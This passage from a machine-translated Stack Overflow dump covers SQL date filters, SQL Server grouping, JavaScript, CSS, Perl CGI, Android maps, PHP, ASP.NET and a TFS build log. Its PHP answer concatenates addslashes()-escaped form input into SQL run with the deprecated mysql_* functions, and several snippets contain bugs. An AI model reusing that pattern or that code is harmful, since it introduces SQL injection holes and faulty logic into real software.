> WHERE 时间戳(CURDATE(),INTERVAL 30 DAY)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:37:28.503

试试这个............

```
SELECT * FROM myTable
WHERE COLUMN_NAME >= NOW() - INTERVAL 15 MINUTE 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:37:27.980

```
SELECT .. FROM <table_name> Where <field_name> >= (DATE_SUB(now(), INTERVAL 15 MINUTE)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T10:38:08.943

我的逻辑告诉我应该尝试**MINUTE**而不是**DAY** .. 你试过了吗？

```
WHERE timestamp(CURDATE(),INTERVAL 15 MINUTE) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-09T10:38:22.497

尝试使用[timestampdiff](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_timestampdiff)

```
TIMESTAMPDIFF(MINUTE,`yourcolumn`,CURDATE()) = 15; 
```

# sql - SQL Server：将类似的销售组合在一起

> ID：15899610
> 
> 赞同：1
> 
> 时间：2013-04-09T10:34:43.003
> 
> 标签：sql, sql-server, group-by, sql-server-2012, aggregate-functions

我正在尝试在 SQL Server 中进行一些报告。这是基本的表设置：

> **订单**（ID、创建日期、状态）
> 
> **产品**（ID、名称、价格）
> 
> **Order_Product_Mapping** (OrderID, ProductID, Quantity, Price, DateOrdered)

在这里，我想创建一个报告来对一段时间内销售额相似的产品进行分组，如下所示：

1个月以上的销售额：

> 1.  可口可乐、百事可乐、老虎：平均 20000 美元（古柯：21000 美元，百事可乐：19000 美元，老虎：20000 美元）
> 2.  面包、肉类：平均 10000 美元（面包：11000 美元，肉类：9000 美元）

注意（）中的文字只是为了澄清，报告中不需要）。用户定义可以考虑相似的销售之间的差异。变化低于 5% 的示例销售被认为是相似的，应该组合在一起。时间段也是用户定义的。

我可以计算一段时间内的总销售额，但不知道如何通过不同的销售额将它们组合在一起。我正在使用 SQL Server 2012。感谢任何帮助。

对不起，我的英语不是很好:)

**更新：** **我想出了我真正需要的东西；）* *

对于已知的数字数组，例如：1,2,3,50,52,100,102,105

我需要将它们分成至少有 3 个数字的组，并且组中任何两个项目之间的差异小于 10。

对于上述数组，输出应为：

[1,2,3]

[100,102,105]

=> 该算法采用 3 个参数：数组、组成一个组的最小项目和 2 个项目之间的最大差异。

如何在 C# 中实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T11:23:35.297

**我不敢相信我做到了~~~**

```
-- this threshold is the key in this query
-- it means that 
-- if the difference between two values are less than the threshold
-- these two values are belong to one group
-- in your case, I think it is 200
DECLARE @th int
SET @th = 200

-- very simple, calculate total price for a time range
;WITH totals AS ( 
  SELECT p.name AS col, sum(o.price * op.quantity) AS val
  FROM order_product_mapping op
  JOIN [order] o ON o.id = op.orderid
  JOIN product p ON p.id = op.productid
  WHERE dateordered > '2013-03-01' AND dateordered < '2013-04-01'
  GROUP BY p.name
),
-- give a row number for each row
cte_rn AS ( -- 
  SELECT col, val, row_number()over(ORDER BY val DESC) rn
  FROM totals
),
-- show starts now,
-- firstly, we make each row knows the row before it 
cte_last_rn AS (
  SELECT col, val, CASE WHEN rn = 1 THEN 1 ELSE rn - 1 END lrn
  FROM cte_rn
),
-- then we join current to the row before it, and calculate 
-- the difference between the total price of current row and that of previous row
-- if the the difference is more than the threshold we make it '1', otherwise '0'
cte_range AS (
  SELECT
    c1.col, c1.val,
    CASE
      WHEN c2.val - c1.val <= @th THEN 0
      ELSE 1
    END AS range,
    rn
  FROM cte_last_rn c1
  JOIN cte_rn c2 ON lrn = rn
),
-- even tricker here,
-- now, we join last cte to itself, and for each row
-- sum all the values (0, 1 that calculated previously) of rows before current row
cte_rank AS (
  SELECT c1.col, c1.val, sum(c2.range) rank
  FROM cte_range c1
  JOIN cte_range c2 ON c1.rn >= c2.rn
  GROUP BY c1.col, c1.val
)
-- now we have properly grouped theres total prices, and we can group on it's rank 
SELECT 
  avg(c1.val) AVG,
  (
    SELECT c2.col + ', ' AS 'data()'
    FROM cte_rank c2
    WHERE c2.rank = c1.rank
    ORDER BY c2.val desc
    FOR xml path('')
  ) product,
  (
    SELECT cast(c2.val AS nvarchar(MAX)) + ', ' AS 'data()'
    FROM cte_rank c2
    WHERE c2.rank = c1.rank
    ORDER BY c2.desc
    FOR xml path('')
  ) price
FROM cte_rank c1
GROUP BY c1.rank
HAVING count(1) > 2 
```

结果将如下所示：

```
AVG     PRODUCT     PRICE
28      A, B, C     30, 29, 27
12      D, E, F     15, 12, 10
3       G, H, I     4, 3, 2 
```

要了解我是如何连接的，请阅读以下内容： [将多行连接成单个文本字符串？](https://stackoverflow.com/questions/194852/concatenate-many-rows-into-a-single-text-string)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:58:02.067

顺便说一句，如果你只想要c#：

```
var maxDifference = 10;
var minItems = 3;     

// I just assume your list is not ordered, so order it first
var array = (new List<int> {3, 2, 50, 1, 51, 100, 105, 102}).OrderBy(a => a);

var result = new List<List<int>>();
var group = new List<int>();
var lastNum = array.First();
var totalDiff = 0;
foreach (var n in array)
{
    totalDiff += n - lastNum;

    // if distance of current number and first number in current group
    // is less than the threshold, add into current group
    if (totalDiff <= maxDifference)
    {
        group.Add(n); 
        lastNum = n;
        continue;
    }

    // if current group has 3 items or more, add to final result
    if (group.Count >= minItems)
        result.Add(group);

    // start new group
    group = new List<int>() { n };
    lastNum = n;
    totalDiff = 0;   
}

// forgot the last group...
if (group.Count >= minItems)
    Result.Add(group); 
```

这里的关键是，数组需要排序，这样你就不需要跳来跳去或存储值来计算距离

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:50:07.587

此查询应产生您期望的结果，它显示您有订单的每个月的产品销售额：

```
SELECT CONVERT(CHAR(4), OP.DateOrdered, 100) + CONVERT(CHAR(4), OP.DateOrdered, 120) As Month , 
Product.Name , 
AVG( OP.Quantity * OP.Price ) As Turnover
FROM Order_Product_Mapping OP
INNER JOIN Product ON Product.ID = OP.ProductID
GROUP BY  CONVERT(CHAR(4), OP.DateOrdered, 100) + CONVERT(CHAR(4), OP.DateOrdered, 120) ,
          Product.Name 
```

未经测试，但如果您提供示例数据，我可以处理它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T14:25:08.890

看起来我让事情变得比它应该的更复杂。这是应该解决问题的方法：

- 运行查询以获取每种产品的销售额。

- 运行 K-mean 或一些类似的算法。

# javascript - 请求动画polyfill内回调中的参数

> ID：15899613
> 
> 赞同：0
> 
> 时间：2013-04-09T10:34:50.010
> 
> 标签：javascript

我阅读了以下请求动画 polyfill。但是，我不明白为什么作者将`currTime + timeToCall`参数放入`callback`in `setInterval`：

```
var id = window.setTimeout(function() {
                callback(currTime + timeToCall);
            }, 
```

这是完整的 polyfill 代码片段：

```
// Set up requestAnimationFrame and cancelAnimationFrame for use in the game code
(function() {
    var lastTime = 0;
    var vendors = ['ms', 'moz', 'webkit', 'o'];
    for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
        window.requestAnimationFrame = window[vendors[x] + 'RequestAnimationFrame'];
        window.cancelAnimationFrame =
        window[vendors[x] + 'CancelAnimationFrame'] ||
        window[vendors[x] + 'CancelRequestAnimationFrame'];
    }
    if (!window.requestAnimationFrame)
        window.requestAnimationFrame = function(callback, element) {
            var currTime = new Date().getTime();
            var timeToCall = Math.max(0, 16 - (currTime - lastTime));
            var id = window.setTimeout(function() {
                callback(currTime + timeToCall);
            },
            timeToCall);
            lastTime = currTime + timeToCall;
            return id;
        };
    if (!window.cancelAnimationFrame)
        window.cancelAnimationFrame = function(id) {
            clearTimeout(id);
        };
}()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T11:53:02.633

polyfill 中的此参数用于覆盖`requestAnimationFrame`规范。如果您打算在动画中使用时间控制，您的回调应提供时间戳参数。 `(currTime + timeToCall)`在 polyfill 中为动画提供了比简单使用更准确的时间戳`setTimeout`。

```
var now, timeBetweenFrames, lastTime;

function animation (timestamp) {
  now  = timestamp; // the value of timestamp is changing
  timeSinceLastFrame = now - lastTime; // time between frames in miliseconds
  lastTime = now;       

  // ... performe your animations

  // you can use the timeSinceLastFrame value, for example, 
  // to interpolate the position of your objects,
  // making the animation reacts equally, independent of performance scenarios

  // here is an example:
  // ... 

  // if you have an object named player, with moves depending on his velocity
  // update the player position
  player.x += player.velocity.x * (timeSinceLastFrame/1000);
  player.y += player.velocity.y * (timeSinceLastFrame/1000);
  // note that timeSinceLastFrame/1000 is the time in seconds instead of miliseconds
  // draw the player on the screen
  player.draw();

  // ...

  requestAnimationFrame(animation);
}

function start() {
  lastTime = Date.now() // or performance.now() like described below this code snippet
  requestAnimationFrame(animation);  // let this party begin
}

start(); 
```

请注意，`timestamp`如果浏览器具有本机支持，则发送给您的回调的参数`requestAnimationFrame`是与 中使用的格式相同的时间，`performance.now()`而不是`Date.now()`. 这适用于某些新版本的浏览器，例如 Chrome。有关更详细的说明，请参阅此 HTML5 Rocks 文章：http: [//updates.html5rocks.com/2012/05/requestAnimationFrame-API-now-with-sub-millisecond-precision](http://updates.html5rocks.com/2012/05/requestAnimationFrame-API-now-with-sub-millisecond-precision)

# css - CSS3 的 :root 伪类和 html 有什么区别？

> ID：15899615
> 
> 赞同：75
> 
> 时间：2013-04-09T10:34:53.543
> 
> 标签：css, css-selectors, pseudo-class

我似乎找不到太多关于此的信息。

[Smashing Magazine](http://coding.smashingmagazine.com/2011/03/30/how-to-use-css3-pseudo-classes/)似乎是这么说的，`html`而且`:root`是一回事，但肯定有一点区别吗？

* * *

## 回答 #1

> 赞同：107
> 
> 时间：2013-04-09T10:37:02.027

来自[W3C 维基](http://www.w3.org/wiki/CSS/Selectors/pseudo-classes/:root)：

> `:root`伪类表示作为文档根的元素。在 HTML 中，这始终是 HTML 元素。

CSS 是一种通用的样式语言。它可以与其他文档类型一起使用，不仅可以与 HTML 一起使用，还可以与 SVG 一起使用。

从[规范](http://www.w3.org/TR/CSS21/)（强调我的）：

> 本规范定义了层叠样式表，第 2 级修订版 1 (CSS 2.1)。CSS 2.1 是一种样式表语言，它允许作者和用户将样式（例如，字体和间距）附加到**结构化文档（例如，HTML 文档和 XML 应用程序）**。

* * *

## 回答 #2

> 赞同：104
> 
> 时间：2015-04-19T09:07:21.873

它们之间的一个技术区别是- 作为伪类比（类型选择器）`:root`具有更大的特异性`html`

```
:root {
  color: red
}
html {
  color: green;
}
```

```
<div>hello world</div>
```

因此，在上面的示例中，`:root`选择器覆盖了`html`选择器并且文本显示为红色。

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2013-04-09T10:37:23.953

对于 HTML 文档，没有区别 - 您的根元素是`<html>`标签，因此`html{}`和`:root{}`（除了特异性不同）在语义上是等价的。

但是，您不仅可以将 CSS 应用于 HTML，还可以将 CSS 应用于所有类似 XML 的文档。这就是为什么`:root`存在 - 无论文档类型如何，都以文档的根元素为目标。大多数人对这种差异感到困惑，因为 CSS 的压倒性主要用例是样式化 HTML 文档。

示例：您可以使用 CSS 设置 SVG 文档的样式。设置样式时，您的根元素将（显然;-)）不是`html`but `svg`。请参阅以下[SVG 标记](https://developer.mozilla.org/en-US/docs/Web/SVG/Element)列表。

# jquery - jQuery AJAX 到 Perl JSON 模块的数据解码

> ID：15899616
> 
> 赞同：1
> 
> 时间：2013-04-09T10:35:08.643
> 
> 标签：jquery, ajax, json, perl, cgi

我需要能够从 ajax 调用的数据部分解码多个参数到 perl cgi 脚本。我知道其他一切都在使用我的代码，但无论出于何种原因，我似乎都无法让 JSON 模块的 decode 方法正常工作以再次将数据从 JSON 格式恢复为参数。我的 jQuery ajax 调用中的数据是这样设置的，没错。

```
data: {
    maxRows: 5,
    productName: request.term
} 
```

但是，我尝试将其解析为 perl 的方式有问题。

```
my $json = JSON->new->utf8->allow_nonref;
my $json_text = $cgi->param('data');
my $json_array = $json->decode( $json_text ); 
```

我知道正确的最终结果应该是一个哈希数组。如果我能走到那一步，我知道我会没事的。但是，我的 decode 行不起作用，实际上导致整个脚本在执行时失败。

我环顾四周，我就是想不通。我很确定这是一些非常小的调整。

我是否通过使用 $cgi->param('data') 正确获取参数？它最终会被命名为数据，还是别的什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:49:13.060

如果您将此作为（异步）POST 请求从 jQuery 发送到您的 Perl 脚本，则需要给它一个参数以供 CGI 解析。否则，您将需要查看整个身体。CGI 无法解析这个数据的东西，因为它的格式不正确。

请求的正文必须采用这种形式`$cgi->param('data')`才能起作用：

```
data=data:{maxRows:5,productName:request.term} 
```

相反，请尝试使用`POSTDATA`获取发送到您的脚本的 HTTP 请求的完整正文。

```
my $data = $query->param('POSTDATA');
my $json_array = $json->decode( $data ); 
```

有关更多信息，请参阅[CGI 文档](https://metacpan.org/module/CGI#HANDLING-NON-URLENCODED-ARGUMENTS)。这个问题也可能有帮助：[如何使用 CGI.pm 获取整个请求正文？](https://stackoverflow.com/questions/908113/how-can-i-get-the-entire-request-body-with-cgi-pm)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T11:04:45.557

您的 JSON 数据无效。使用[JSONLint](http://jsonlint.com/)验证您的数据。JSON数据的正确示例如下：

```
{
    "maxRows": 5,
    "productName": "request.term"
} 
```

如果省略`data:`键并用引号将对象内的所有键括起来，应该没问题。表达式 request.term 不允许在字符串之外，因为它没有被定义。

**编辑**

好的，您正在使用 jQuery 发送 JSON 数据。在[这里](https://stackoverflow.com/questions/6587221/send-json-data-with-jquery)查看如何通过 Ajax 从 jQuery 正确发送 JSON。此外，我建议使用[FireBug](https://addons.mozilla.org/en-US/firefox/addon/firebug/)检查 jQuery.ajax 发布的数据。

# android - 添加标记时自动打开 InfoWindow Google Maps v2 Android

> ID：15899619
> 
> 赞同：41
> 
> 时间：2013-04-09T10:35:20.070
> 
> 标签：android, google-maps-android-api-2, marker, infowindow

当我们添加标记时，有没有办法自动打开信息窗口？使用此代码添加标记，但信息窗口仅在单击标记时打开：

```
myMap.addMarker(new MarkerOptions()
            .position(latLng)
            .title("Title")
            .snippet("Snippet")
            .icon(BitmapDescriptorFactory
                    .fromResource(R.drawable.marker))); 
```

* * *

## 回答 #1

> 赞同：127
> 
> 时间：2013-04-09T10:44:45.127

根据[Google Maps for Android V2](https://developers.google.com/maps/documentation/android/marker)的文档：

> 信息窗口允许您在用户点击地图上的标记时向他们显示信息。默认情况下，如果标记设置了标题，则当用户点击标记时会显示信息窗口。一次只显示一个信息窗口。如果用户点击另一个标记，当前窗口将被隐藏并显示新的信息窗口。您可以通过在目标标记上调用***showInfoWindow()***以编程方式显示信息窗口 。***通过调用hideInfoWindow()***可以隐藏信息窗口。

您可以像这样显示信息窗口：

```
Marker marker = myMap.addMarker(new MarkerOptions()
                     .position(latLng)
                     .title("Title")
                     .snippet("Snippet")
                     .icon(BitmapDescriptorFactory
                     .fromResource(R.drawable.marker)));

marker.showInfoWindow(); 
```

# html - HTML 链接在其中不起作用 标签

> ID：15899629
> 
> 赞同：0
> 
> 时间：2013-04-09T10:35:49.997
> 
> 标签：html, css

我正在制作一个模板来玩弄代码，并且很难让“模板商店”链接正常工作。

请您帮我解决这个问题，因为单击时当前没有任何反应。

**更新：**

这是我网站的链接 - [http://www.graphixinc.co.za/test/index.html](http://www.graphixinc.co.za/test/index.html)。我在`target = _blank`这里使用，但它不起作用。

**这是代码：**

```
<div class="navigation">
        <img src="images/navigate.png" alt="navigate_img"/>
        <ul>  
            <li>  
                <a href="#take-me-home" class="nav-active rounded"><span>Take Me Home</span></a>  
            </li> 
            <li>  
                <a href="http://www.mywebsite.co.za/store" class="roundedss" target="blank"><span>Template Store</span></a>  
            </li> 
            <li>  
                <a href="#about" class="rounded"><span>About</span></a>  
            </li>  
            <li>  
                <a href="#services" class="rounded"><span>Services</span></a>    
            </li>  
            <li>  
                <a href="#showcase" class="rounded"><span>Portfolio</span></a>    
            </li>
            <li>  
                <a href="#our-team" class="rounded"><span>On Promo</span></a>    
            </li>   
            <li>  
                <a href="#news" class="rounded"><span>News</span></a>  
            </li> 
            <li>  
                <a href="#contact-us" class="rounded"><span>Contact Us</span></a>  
            </li>  

        </ul>  
    </div> 
```

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:39:06.680

那是因为`target="blank"`应该 `target="_blank"`

```
<a href="http://www.mywebsite.co.za/store" class="roundedss" target="_blank"><span>Template Store</span></a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:42:56.670

目标应该是“_blank”，我测试了它......

```
<a href="http://www.mywebsite.co.za/store" class="roundedss" target="_blank"><span>Template Store</span></a> 
```

[这](http://jsfiddle.net/KRsxS/1/)是它的小提琴，它工作正常......

# php - 为数组插入 php 失败

> ID：15899632
> 
> 赞同：1
> 
> 时间：2013-04-09T10:35:56.640
> 
> 标签：php, arrays

我有问题。当我什么都不提交到mysql数据库时。矩阵可以与不同的证书名称相同。实际上，我尝试使用数组但我无法配置它...请帮助我

```
<html>
<head>
<script language="javascript">
fields = 0;
function addInput() {
if (fields != 10) {
document.getElementById('text').innerHTML += "<br/><input type='text' name='cer[]' size='30' />";

fields += 1;

} else {
document.getElementById('text').innerHTML += "<br />Maximum 10 fields allowed.";
document.form.add.disabled=true;
}
}
</script>
</head>
<body>
<form action="" method="post"> 
<div id="text"><p>matric</p> 
  <input type="text" name="matric" size="30" /> 
 <div id="text"><p>Certificate name</p> 
  <input type="text" name="cer[]" size="30" /> 
  <br /> 
 <input type="button" onclick="addInput()" name="add" value="Add input field" />
 <input type="submit" value="Submit" name="sumbit"/>
 </div> 
</form> 
<?php
include 'dbconnect.php';
if (isset($_POST['submit'])){

$Matric = addslashes($_POST['Matric']);
$Cer_name = addslashes($_POST['cer[]']);

if(!empty($Cer_name)){
$query = "INSERT INTO certificate (Matric,Cer_name) VALUE ('$Matric','$Cer_name')";
$result = mysql_query($query);
}
}
?>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:46:39.823

我猜`Cer_name`你的数据库表中的列必须是 varchar 类型。你正在尝试存储完整的数组。所以更好的方法是尝试将证书保存为逗号分隔。

```
$Cer_name = addslashes(implode(',', $_POST['cer']));
$query = "INSERT INTO certificate (Matric,Cer_name) VALUE ('$Matric','$Cer_name')";
$result = mysql_query($query) or die(mysql_error()); 
```

**注意：** [**请不要`mysql_*`在新代码中使用函数**](https://stackoverflow.com/q/12859942/)。它们不再被维护[并被正式弃用](https://wiki.php.net/rfc/mysql_deprecation)。看到[**红框**](https://www.php.net/manual/en/function.mysql-connect.php)了吗？改为了解[*准备好的语句*](https://en.wikipedia.org/wiki/Prepared_statement)，并使用[PDO](http://php.net/pdo)或[MySQLi](http://php.net/mysqli) -[本文](https://php.net/manual/en/mysqlinfo.api.choosing.php)将帮助您决定使用哪个。如果您选择 PDO，[这里有一个很好的教程](http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers)。

# c# - 在公共方法中分配对象

> ID：15899634
> 
> 赞同：2
> 
> 时间：2013-04-09T10:36:06.823
> 
> 标签：c#, asp.net

我希望在我的母版页上创建一个公共方法，我可以从每个子页面中调用它。我正在努力思考应该如何做到这一点。

在我的子页面上，我使用这种方法来填充一个错误消息的面板。

```
protected void errorMessage (string errorText) {
  HtmlGenericControl divTag = new HtmlGenericControl("div");
  Panel_Name.Controls.Add(divTag);
  divTag.InnerHtml = errorText;
} 
```

现在，如果我要在我的母版页上公开此功能，它不会识别我的面板，因为它还没有显示。我猜答案涉及`FindControl` （对不起我的垃圾代码英语）

我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:43:59.113

公平地说，对于您的方案，我会在您的页面 (.aspx) 上使用 UserControl (.ascx)。

然后，在 UserControl 中，有您的错误消息标记，例如：

**代码前端 (ErrorMessage.ascx)**

```
 <asp:Panel runat="server" ID="PanelErrorMessage" /> // creates a <div> 
```

**隐藏代码 (ErrorMessage.ascx.cs)**

```
public string ErrorMessage 
{ 
    get {}
    set 
    {
         PanelErrorMessage.Text = value; // sets the panel text (<div>text</div>) to value when property is set
    }
} 
```

在您的页面上使用您的 UserControl（您还需要使用前缀/后缀将其定义为页面上的控制标记）：

```
<myControls:ErrorMessage runat="server" ID="MyErrorControl" /> 
```

如果您需要不同的错误，您也可以在页面上的许多地方执行此操作。

然后，当您遇到错误时，您只需执行以下操作：

```
MyErrorControl.ErrorMessage = "This is my error message"; 
```

任务完成！

# tfs - 在 Team Foundation Service 中使用包还原时生成问题

> ID：15899638
> 
> 赞同：13
> 
> 时间：2013-04-09T10:36:19.193
> 
> 标签：tfs, compiler-errors, nuget, tfsbuild, azure-devops

我正在尝试 Microsoft Team Foundation Service ( Cloud TFS ) 并使用自动托管构建和包还原。

它总是失败，但根据日志，似乎包还原工作正常，但是在找到我们通过包还原获得的二进制文件时出现问题，就像它没有查看正确的文件夹一样。

日志：

```
Build started 4/9/2013 10:24:37 AM.
Project "C:\a\src\ValuePlan.Client.sln" on node 1 (default targets).
ValidateSolutionConfiguration:
  Building solution configuration "Release|x86".
Project "C:\a\src\ValuePlan.Client.sln" (1) is building "C:\a\src\VP\VP.csproj" (2) on node 1 (default targets).
RestorePackages:
  "C:\a\src\.nuget\nuget.exe" install "C:\a\src\VP\packages.config" -source "" -o "C:\a\src\packages"
  Successfully installed 'Autofac 2.6.3.862'.
  Successfully installed 'Caliburn.Micro 1.3.1'.
PrepareForBuild:
  Creating directory "obj\x86\Release\".
Project "C:\a\src\VP\VP.csproj" (2) is building "C:\a\src\VpUserControls\VpUserControls.csproj" (3) on node 1 (default targets).
RestorePackages:
  "C:\a\src\.nuget\nuget.exe" install "C:\a\src\VpUserControls\packages.config" -source "" -o "C:\a\src\packages"
  All packages listed in packages.config are already installed.
PrepareForBuild:
  Creating directory "obj\Release\".
ResolveAssemblyReferences:
  A TargetFramework profile exclusion list will be generated.
  Primary reference "Caliburn.Micro".
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Common.targets(1578,5): warning MSB3245: Could not resolve this reference. Could not locate the assembly "Caliburn.Micro". Check to make sure the assembly exists on disk. If this reference is required by your code, you may get compilation errors. [C:\a\src\VpUserControls\VpUserControls.csproj]
          For SearchPath "C:\a\src\VpUserControls\FakesAssemblies".
          Considered "C:\a\src\VpUserControls\FakesAssemblies\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\a\src\VpUserControls\FakesAssemblies\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\a\src\VpUserControls\FakesAssemblies\Caliburn.Micro.exe", but it didn't exist.
          For SearchPath "{HintPathFromItem}".
          Considered "..\..\CL_WIN\packages\Caliburn.Micro.1.3.1\lib\net40\Caliburn.Micro.dll", but it didn't exist.
          For SearchPath "{TargetFrameworkDirectory}".
          Considered "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\Profile\Client\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\Profile\Client\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\Profile\Client\Caliburn.Micro.exe", but it didn't exist.
          For SearchPath "{Registry:Software\Microsoft\.NETFramework,v4.0,AssemblyFoldersEx}".
          Considered AssemblyFoldersEx locations.
          For SearchPath "{AssemblyFolders}".
          Considered "C:\Program Files\Microsoft.NET\ADOMD.NET\100\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft.NET\ADOMD.NET\100\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft.NET\ADOMD.NET\100\Caliburn.Micro.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\Caliburn.Micro.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\Tasks\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\Tasks\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\Tasks\Caliburn.Micro.exe", but it didn't exist.
          Considered "C:\Program Files\IIS\Microsoft Web Deploy V3\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\IIS\Microsoft Web Deploy V3\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\IIS\Microsoft Web Deploy V3\Caliburn.Micro.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\PipelineComponents\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\PipelineComponents\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\PipelineComponents\Caliburn.Micro.exe", but it didn't exist.
          Considered "C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\Caliburn.Micro.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\ForEachEnumerators\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\ForEachEnumerators\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\ForEachEnumerators\Caliburn.Micro.exe", but it didn't exist.
          For SearchPath "{GAC}".
          Considered "Caliburn.Micro", which was not found in the GAC.
          For SearchPath "{RawFileName}".
          Considered treating "Caliburn.Micro" as a file name, but it didn't exist.
          For SearchPath "C:\a\bin\".
          Considered "C:\a\bin\Caliburn.Micro.winmd", but it didn't exist.
          Considered "C:\a\bin\Caliburn.Micro.dll", but it didn't exist.
          Considered "C:\a\bin\Caliburn.Micro.exe", but it didn't exist.
  Primary reference "System.Windows.Interactivity".
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Common.targets(1578,5): warning MSB3245: Could not resolve this reference. Could not locate the assembly "System.Windows.Interactivity". Check to make sure the assembly exists on disk. If this reference is required by your code, you may get compilation errors. [C:\a\src\VpUserControls\VpUserControls.csproj]
          For SearchPath "C:\a\src\VpUserControls\FakesAssemblies".
          Considered "C:\a\src\VpUserControls\FakesAssemblies\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\a\src\VpUserControls\FakesAssemblies\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\a\src\VpUserControls\FakesAssemblies\System.Windows.Interactivity.exe", but it didn't exist.
          For SearchPath "{HintPathFromItem}".
          Considered "..\..\CL_WIN\packages\Caliburn.Micro.1.3.1\lib\net40\System.Windows.Interactivity.dll", but it didn't exist.
          For SearchPath "{TargetFrameworkDirectory}".
          Considered "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\Profile\Client\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\Profile\Client\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\Profile\Client\System.Windows.Interactivity.exe", but it didn't exist.
          For SearchPath "{Registry:Software\Microsoft\.NETFramework,v4.0,AssemblyFoldersEx}".
          Considered AssemblyFoldersEx locations.
          For SearchPath "{AssemblyFolders}".
          Considered "C:\Program Files\Microsoft.NET\ADOMD.NET\100\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft.NET\ADOMD.NET\100\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft.NET\ADOMD.NET\100\System.Windows.Interactivity.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\110\SDK\Assemblies\System.Windows.Interactivity.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\Tasks\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\Tasks\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\Tasks\System.Windows.Interactivity.exe", but it didn't exist.
          Considered "C:\Program Files\IIS\Microsoft Web Deploy V3\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\IIS\Microsoft Web Deploy V3\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\IIS\Microsoft Web Deploy V3\System.Windows.Interactivity.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\PipelineComponents\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\PipelineComponents\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\PipelineComponents\System.Windows.Interactivity.exe", but it didn't exist.
